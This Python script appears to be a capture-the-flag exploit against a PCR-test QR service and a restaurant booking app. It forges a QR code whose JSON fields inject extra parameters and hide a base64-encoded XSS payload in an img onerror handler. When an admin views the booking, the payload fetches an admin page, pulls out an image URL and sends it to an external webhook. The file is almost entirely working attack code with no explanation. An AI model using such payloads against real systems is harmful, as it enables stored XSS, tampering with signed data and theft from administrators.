import requests
import qrcode
import json
import base64

target_rest = 'localhost:5000'
target_lab = 'liquidlab.task.sasc.tf'


def get_qr():
    return requests.post(f'https://{target_lab}/get_qr', data={
        'birth_date': '1995-03-03',
        'fullname': 'Wise Oldman',
        'id_number': 1000000
    }).content


def create_booking():
    return requests.post(f'http://{target_rest}/book', data={
        'name': 'Walter Whiste',
        'time': 1814328865,
        'visitors': 3,
        'phone_number': '+42281337',
        'comment': 's' + 'a' * 200
    }, files={'qr_image': open('qr_exp.png', 'rb')}).text


def main():
    xss_payload = "fetch('/admin/review_booking/0').then(e => e.text().then(e => {let a=(new DOMParser().parseFromString(e,'text/html').querySelector('img').src);window.location.assign(`https://webhook?img=${a}`)}))"
    xss_payload = base64.b64encode(xss_payload.encode()).decode()

    data = {"birth_date": "1995-03-03", "fullname": "Wise Oldman&authorized_center=LiquidLab PCRMobile&expire=1716609348", "id_number": 1000000, "expire": 0, "authorized_center": f"<img src=x onerror=eval(atob('{xss_payload}'))>", "sign": "ec0ce44d3cfe2da2ea51537d4a60b4cbe76d1bdf"}
    img = qrcode.make(json.dumps(data))
    img.save('qr_exp.png')
    # with open('qr.png', 'wb') as f:
    #     f.write(get_qr())
    print(create_booking())


if __name__ == '__main__':
    main()
